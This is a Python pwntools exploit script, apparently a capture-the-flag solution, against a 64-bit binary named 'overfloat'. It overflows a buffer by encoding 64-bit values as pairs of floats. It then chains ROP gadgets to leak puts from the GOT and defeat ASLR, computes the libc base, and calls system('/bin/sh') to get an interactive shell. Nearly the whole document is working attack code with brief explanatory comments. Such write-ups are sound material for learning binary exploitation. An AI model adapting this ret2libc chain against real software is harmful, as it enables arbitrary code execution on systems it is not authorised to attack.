import struct
import pwn

# overfloat is a 64-bit dynamically-linked binary
# NX is enabled; ASLR is turned on

# This is essentially a basic rop chain with puts(puts got) to defeat ASLR with one key difference:
# That is that we have to send our values as floats 


target = pwn.process('./overfloat')
#gdb.attach(target)

libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
overfloat_elf = pwn.ELF('overfloat')

################################################
#### Helper Function to Send Value as Float ####
################################################

def send_val_as_float(x):
	lower_half = x & 0x00000000ffffffff
	upper_half = (x >> 32) & 0x00000000ffffffff

	lower_half = struct.pack('<I', lower_half)
	upper_half = struct.pack('<I', upper_half)
	
	target.sendline(str(struct.unpack('f', lower_half)[0]).encode())
	target.sendline(str(struct.unpack('f', upper_half)[0]).encode())


########################################
#### Some Gadgets that We will Need ####
########################################

# pop rdi
pop_rdi = 0x0000000000400a83

# ret padding
ret_padding = 0x0000000000400a84

# Address of start of main
main_addr = 0x00400993

########################################################
#### Leaking Address of puts in libc to defeat ASLR ####
########################################################

# PLT puts
# Equivalent to doing: objdump -D overfloat | grep puts
puts_plt = overfloat_elf.symbols['puts']

# GOT puts
# Equivalent to doing: objdump -R overfloat | grep puts
puts_got = overfloat_elf.got['puts']

print(f"puts plt: {hex(puts_plt)} \nputs got: {hex(puts_got)}")

for i in range(0,7):
	target.recvuntil(b']: ')
	send_val_as_float(0xaaaaaaaabbbbbbbb)

send_val_as_float(pop_rdi)
send_val_as_float(puts_got)
send_val_as_float(puts_plt)
send_val_as_float(main_addr)
target.sendline(b'done')

target.recvuntil(b'VOYAGE!\n')

leak = target.recvline().strip(b'\n')

puts_leaked_addr = leak + b'\0' * (8 - len(leak))
puts_leaked_addr = struct.unpack("<Q", puts_leaked_addr)[0]
print(f"Leaked puts addr = {hex(puts_leaked_addr)}")

#########################################################
#### Calculating libc base and sending final payload ####
#########################################################

# Equivalent Command line commands:
	# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
	# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
	# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh

libc_puts_offset = libc_elf.symbols['puts']
libc_system_offset = libc_elf.symbols['system']
libc_bin_sh_offset = next(libc_elf.search(b'/bin/sh'))

print(f" libc_puts: {hex(libc_puts_offset)}, libc_system: {hex(libc_system_offset)}, libc_bin_sh: {hex(libc_bin_sh_offset)}")

libc_base = puts_leaked_addr - libc_puts_offset

for i in range(0,7):
	send_val_as_float(0xaaaaaaaabbbbbbbb)

send_val_as_float(pop_rdi)
send_val_as_float(libc_base + libc_bin_sh_offset)
send_val_as_float(ret_padding)
send_val_as_float(libc_base + libc_system_offset)

target.sendline(b'done')

target.interactive()

